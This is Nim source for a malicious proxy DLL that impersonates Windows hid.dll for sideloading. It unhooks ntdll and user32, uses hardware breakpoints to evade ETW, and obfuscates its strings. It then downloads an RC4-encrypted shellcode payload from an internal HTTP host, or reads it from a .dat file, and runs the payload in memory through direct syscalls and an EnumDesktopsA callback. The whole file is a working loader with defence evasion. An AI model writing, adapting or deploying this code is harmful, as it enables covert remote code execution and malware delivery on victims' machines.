import core/[rc_for, morph, unhk_module, etw_hwbp, static_strs, util]
import std/[strutils]
import nimvoke/dinvoke 
import nimvoke/syscalls
from base64 import decode 
from winim import NTSTATUS, TRUE, FALSE, NT_SUCCESS, HANDLE, WINBOOL, HWINSTA, LPCWSTR, ULONG, NULL, PVOID, LPVOID, SIZE_T, PSIZE_T, LPARAM, LRESULT, WPARAM, UINT, HWND, WM_USER,
                  HHOOK, WM_DESTROY, WM_NULL, WM_APP, PM_REMOVE, WH_GETMESSAGE, CS_VREDRAW, CS_HREDRAW, IDI_APPLICATION, IDC_ARROW, WHITE_BRUSH, DWORD, WM_SIZE, WM_TIMER,
                  HMENU, HINSTANCE, WS_OVERLAPPEDWINDOW, HWND_MESSAGE, MSG, WNDCLASSEXW, DESKTOPENUMPROCA, PAGE_EXECUTE_READ, MEM_COMMIT, 
                  HOOKPROC, ATOM, MEM_RESERVE, PAGE_READWRITE, FILE_SYNCHRONOUS_IO_NONALERT, FILE_NON_DIRECTORY_FILE, FILE_SHARE_READ, FILE_GENERIC_READ, GENERIC_EXECUTE,
                  SYNCHRONIZE, OBJ_CASE_INSENSITIVE, FILE_STANDARD_INFORMATION, OBJECT_ATTRIBUTES, UNICODE_STRING, IO_STATUS_BLOCK, FILE_INFORMATION_CLASS, PAINTSTRUCT, RECT,
                  ACCESS_MASK, BOOL, RGB, FW_NORMAL, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, SW_SHOW,
                  SM_CXSCREEN, SM_CYSCREEN, SM_CXFULLSCREEN,
                  GetDC, CreateSolidBrush, SelectObject, DeleteObject, ReleaseDC, Rectangle, GetSystemMetrics, CreateFontW, BeginPaint, EndPaint, GetClientRect,
                  RtlDosPathNameToNtPathName_U, InitializeObjectAttributes, GetProcessWindowStation, GetModuleHandle, GetProcAddress, LoadLibraryA, PostMessage,
                  DefWindowProcW, LoadIconW, LoadCursorW, GetStockObject, GetModuleHandleW, SendMessage, Sleep, TranslateMessage, DispatchMessageW, GetMessageW,
                  ShowWindow, PostQuitMessage, GetWindowThreadProcessId, PostMessageA, `L`, `&`

when defined(net):
  import core/build_ua
  import httpclient, net

proc NimMain() {.cdecl, importc.}

let 
  url       = jam("http://172.16.0.4:8000/test.html")
  proxyUrl  = ""
  rc4Key    = jam("test")
  datName   = jam("test.dat")

var 
  g_hHook: HHOOK
  g_triggered = false 
  g_triggerSet = false
  g_hwndMain: HWND

const 
  WM_SHOWWINDOW = 0x0018
  FS_INFORMATION: FILE_INFORMATION_CLASS = FILE_INFORMATION_CLASS(5'i32)

dinvokeDefine(EnumDesktopsA, "user32.dll", proc (hwinsta: HWINSTA, lpEnumFunc: DESKTOPENUMPROCA, lParam: LPARAM): WINBOOL {.stdcall.})
dinvokeDefine(CreateWindowExW, "user32.dll", proc (dwExStyle: DWORD, lpClassName: LPCWSTR, lpWindowName: LPCWSTR, dwStyle: DWORD, X: int32, Y: int32, nWidth: int32, nHeight: int32, hWndParent: HWND, hMenu: HMENU, hInstance: HINSTANCE, lpParam: LPVOID): HWND {.stdcall.})
dinvokeDefine(RegisterClassExW, "user32.dll", proc (P1: ptr WNDCLASSEXW): ATOM {.stdcall.})
dinvokeDefine(PostThreadMessageA, "user32.dll", proc (idThread: DWORD, Msg: UINT, wParam: WPARAM, lParam: LPARAM): WINBOOL {.stdcall.})
dinvokeDefine(SetWindowsHookExA, "user32.dll", proc (idHook: int32, lpfn: HOOKPROC, hmod: HINSTANCE, dwThreadId: DWORD): HHOOK {.stdcall.})
dinvokeDefine(CallNextHookEx, "user32.dll", proc (hhk: HHOOK, nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.})
dinvokeDefine(UnhookWindowsHookEx, "user32.dll", proc (hhk: HHOOK): WINBOOL {.stdcall.})

proc getPLFromHTML(content: string): string = 
  let 
    sMarker = jam("<!-- PAYLOAD_START -->")
    eMarker = jam("<!-- PAYLOAD_END -->")
  
  let sPos = content.find(sMarker)
  if sPos == -1: return ""

  let ePos = content.find(eMarker, sPos + sMarker.len)
  if ePos == -1: return ""

  let 
    plStart = sPos + sMarker.len
    plEnd   = ePos 
    pl      = content[plStart ..< plEnd]

  return pl.strip() 

proc HidD_MainRoutine(): bool =
  var 
    shellcode: seq[byte]
    dscn: string
    dscd: string
    
  when defined(ondisk):
    var
      fStatus : NTSTATUS
      hFile   : HANDLE 
      isob    : IO_STATUS_BLOCK 
      ntUs    : UNICODE_STRING 
      oa      : OBJECT_ATTRIBUTES 
      fsi     : FILE_STANDARD_INFORMATION 
      ifLen   : ULONG = ULONG(sizeof(fsi))
    
    let scDatPath = joinPath(getAppDir(), datName)
    if not fileExists(scDatPath): quit(3)
    let wdatPath = newWideCString(scDatPath)
    RtlDosPathNameToNtPathName_U(wdatPath, &ntUs, NULL, NULL)
    InitializeObjectAttributes(&oa, &ntUs, OBJ_CASE_INSENSITIVE, 0, NULL)

    let desired : ACCESS_MASK = ACCESS_MASK(FILE_GENERIC_READ or SYNCHRONIZE)
    let share   : ULONG       = ULONG(FILE_SHARE_READ)
    let options : ULONG       = ULONG(FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE)

    fStatus = syscall(NtOpenFile, &hFile, desired, &oa, &isob, share, options)
    fStatus = syscall(NtQueryInformationFile, hFile, &isob, cast[pointer](&fsi), ifLen, FS_INFORMATION)
    
    let fs = int(fsi.EndOfFile.QuadPart)
    if fs <= 0:
      discard syscall(NtClose, hFile)
      return false
    
    var sc = newSeq[byte](fs)
    fStatus = syscall(NtReadFile, hFile, 0, 0, 0, &isob, cast[pointer](&sc[0]), ULONG(fs), NULL, NULL)
    
    dscd = bytesToString(rc4Apply(toBytes(rc4Key), sc))
    shellcode = toByteSeq(dscd)

  when defined(net):
    let 
      ua = buildChromiumUA()
      headers = [
        ("User-Agent", ua),
        ("Content-Type", "text/html, */*"),
        ("Accept-Encoding", "gzip, deflate")
      ]

    var
      client: HttpClient 
      response: Response 
    
    if proxyUrl.len > 4:
      let proxy = newProxy(proxyUrl)
      client = newHttpClient(proxy=proxy)
    else:
      client = newHttpClient()
    
    #client.timeout = 10

    for (key, value) in headers:
      client.headers.add(key, value)
    
    response = client.request(url, httpMethod=HttpGet)
    if response.code.is2xx:
      let exPl = getPLFromHTML(response.body)
      if exPL.len > 0:
        dscn = frcDec(rc4Key, decode(exPL))
        shellcode = toByteSeq(dscn)
      else:
        client.close()
        return false 
    else:
      client.close()
      return false 
    
    if not client.isNil:
      client.close()

  var
    iStatus  : NTSTATUS
    baseAddr : PVOID 
    hProc    : HANDLE = 0xFFFFFFFFFFFFFFFF
    scSize   : SIZE_T = shellcode.len.SIZE_T 
  
  iStatus = syscall(NtAllocateVirtualMemory, hProc, &baseAddr, 0, &scSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
  if not NT_SUCCESS(iStatus):
    return false 
  
  var bytesWritten: SIZE_T
  iStatus = syscall(ZwWriteVirtualMemory, hProc, baseAddr, &shellcode[0], scSize.SIZE_T, cast[PSIZE_T](&bytesWritten))
  if not NT_SUCCESS(iStatus):
    return false 
  
  var oldProtect: DWORD
  iStatus = syscall(ZwProtectVirtualMemory, hProc, &baseAddr, &scSize, PAGE_EXECUTE_READ, &oldProtect)
  if not NT_SUCCESS(iStatus):
    return false 
  
  discard EnumDesktopsA(GetProcessWindowStation(), cast[DESKTOPENUMPROCA](baseAddr), cast[LPARAM](NULL))
  return true

proc getMsgProc(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} = 
  if nCode >= 0 and wParam == PM_REMOVE:
    var msg = cast[ptr MSG](lParam)
    
    # Check if it's the right trigger message AND from the right window
    if msg.message == WM_USER + 100 and msg.hwnd == g_hwndMain and not g_triggered:
      if g_hHook != 0:
        let tempHook = g_hHook
        g_hHook = 0
        discard UnhookWindowsHookEx(tempHook)

      discard HidD_MainRoutine()
      g_triggered = true
      PostQuitMessage(0)
      return 1
  
  return CallNextHookEx(g_hHook, nCode, wParam, lParam)

proc hkSetup(hwnd: HWND) = 
  if g_triggerSet:
    return
  
  g_triggerSet = true
  g_hwndMain = hwnd  # Store the window handle
  
  # Get the TID that owns the window
  let windowThreadId = GetWindowThreadProcessId(hwnd, nil)

  # Set hook for the window's thread
  g_hHook = SetWindowsHookExA(WH_GETMESSAGE, getMsgProc, GetModuleHandle(NULL), windowThreadId)
  if g_hHook == 0:
    return
  
  # Post to the window to ensure it goes through the hook
  discard PostMessageA(hwnd, WM_USER + 100, 0, 0)

proc windProc(hWnd: HWND, uMsg: UINT, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} = 
  case uMsg
    of WM_SHOWWINDOW:
      if wParam != 0:
        if not g_triggered:
          let hdc = GetDC(hwnd)
          if hdc != 0:
            let hBrush = CreateSolidBrush(RGB(255, 0, 0))
            let hOldBrush = SelectObject(hdc, hBrush)
            Rectangle(hdc, -100, -100, -50, -50)
            SelectObject(hdc, hOldBrush)
            DeleteObject(hBrush)
            ReleaseDC(hwnd, hdc)
          
          let hFont = CreateFontW(
            12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, 
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, L"Comic Sans"
          )
          if hFont != 0:
            DeleteObject(hFont)

          discard uhkModule(jam("user32.dll"))
          hkSetup(hWnd)
        else:
          return 0
      return DefWindowProcW(hWnd, uMsg, wParam, lParam)
    
    of WM_SIZE:
      var 
        rc: RECT
        ps: PAINTSTRUCT
      discard BeginPaint(hWnd, &ps) 
      GetClientRect(hWnd, &rc)
      EndPaint(hWnd, &ps)
      return 0
    
    of WM_USER + 100:
      # This shouldn't happen if the hook catches it first, but handling just in case
      if not g_triggered:
        discard HidD_MainRoutine()
        g_triggered = true
      return 0

    of WM_DESTROY:
      PostQuitMessage(0)
      return 0 
    
    else:
      return DefWindowProcW(hWnd, uMsg, wParam, lParam)

proc sendMessages(hwnd: HWND) =
  let messages = [
    WM_USER + 1,
    WM_USER + 2,
    WM_USER + 3,
    0x0400,
    0x0401,
    0x0402,
    WM_NULL,
    WM_TIMER
  ]

  for i in 0 ..< messages.len: 
    let msg = messages[i]
    discard PostMessage(hwnd, msg.UINT, i.WPARAM, (i * 1000).LPARAM)
    Sleep(100) 
  
proc start() = 
  let clsName = L"HidDWindow"
  var wc: WNDCLASSEXW 

  wc.cbSize = sizeof(wc).UINT
  wc.style = CS_HREDRAW or CS_VREDRAW
  wc.lpfnWndProc = windProc
  wc.cbClsExtra = 0
  wc.cbWndExtra = 0
  wc.hInstance = GetModuleHandleW(NULL)
  wc.hIcon = LoadIconW(0, IDI_APPLICATION)
  wc.hCursor = LoadCursorW(0, IDC_ARROW)
  wc.hbrBackground = GetStockObject(WHITE_BRUSH)
  wc.lpszMenuName = NULL
  wc.lpszClassName = clsName
  wc.hIconSm = LoadIconW(0, IDI_APPLICATION)
  
  if RegisterClassExW(&wc) == 0:
    return
  
  let hwnd = CreateWindowExW(0, clsName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, HWND_MESSAGE, 0, wc.hInstance, NULL)
  if hwnd == 0:
    return 
  
  discard GetSystemMetrics(SM_CXSCREEN)
  discard GetSystemMetrics(SM_CYSCREEN)
  discard GetSystemMetrics(SM_CXFULLSCREEN)
  sendMessages(hwnd)
  discard ShowWindow(hwnd, SW_SHOW)
  
  var msg: MSG
  while GetMessageW(&msg, 0, 0, 0) != 0:
    TranslateMessage(&msg)
    DispatchMessageW(&msg)

proc main(param: LPVOID): DWORD {.stdcall.} =
  start()
  return 0

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  return true

type
  functionType = proc (arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall.}

proc `HidD_GetHidGuid`(arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall, exportc, dynlib.} =
  NimMain()
  var
    res: uint64 = 0
    status: NTSTATUS
    hThread: HANDLE 
    hProc: HANDLE = 0xFFFFFFFFFFFFFFFF
    
  discard uhkModule(jam("ntdll.dll"))
  discard setHWBPonNTTE()
  let startAddr = cast[PVOID](main)
  status = syscall(ZwCreateThreadEx, &hThread, GENERIC_EXECUTE, NULL, hProc, startAddr, NULL, FALSE, NULL, NULL, NULL, NULL)
  status = syscall(ZwWaitForSingleObject, hThread, FALSE, 0)
  var origDll = LoadLibraryA("C:\\Windows\\System32\\hid.dll")
  var origFunction = GetProcAddress(origDll, "HidD_GetHidGuid")
  var fnPtr = cast[functionType](origFunction)
  res = fnPtr(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12)
  return res

proc `HidD_FlushQueue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_FreePreparsedData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetAttributes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetConfiguration`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetFeature`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetIndexedString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetInputReport`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetManufacturerString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetMsGenreDescriptor`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetNumInputBuffers`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetPhysicalDescriptor`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetPreparsedData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetProductString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_GetSerialNumberString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_Hello`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_SetConfiguration`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_SetFeature`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_SetNumInputBuffers`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidD_SetOutputReport`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetButtonArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetButtonCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetExtendedAttributes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetLinkCollectionNodes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetScaledUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetSpecificButtonCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetSpecificValueCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetUsageValueArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetUsages`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetUsagesEx`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetValueCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_GetVersionInternal`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_InitializeReportForID`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_MaxDataListLength`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_MaxUsageListLength`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_SetButtonArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_SetData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_SetScaledUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_SetUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_SetUsageValueArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_SetUsages`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_TranslateUsagesToI8042ScanCodes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_UnsetUsages`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true

proc `HidP_UsageListDifference`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  return true